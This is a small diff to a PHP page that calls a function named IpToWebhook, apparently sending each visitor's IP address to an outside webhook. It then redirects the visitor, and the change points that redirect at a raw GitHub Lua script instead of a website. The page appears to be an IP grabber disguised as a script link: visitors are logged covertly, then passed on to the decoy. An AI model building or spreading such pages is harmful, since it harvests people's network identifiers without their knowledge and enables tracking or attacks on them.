@@ -48,5 +48,5 @@ function IpToWebhook($Hook, $Content)
 }
 
 IpToWebhook($Webhook, $JSON);
-header("Location: https://www.littest.site");
+header("Location: https://raw.githubusercontent.com/dollarxxxxxxxxxx/SplashScript/master/SaS.lua");
 ?>
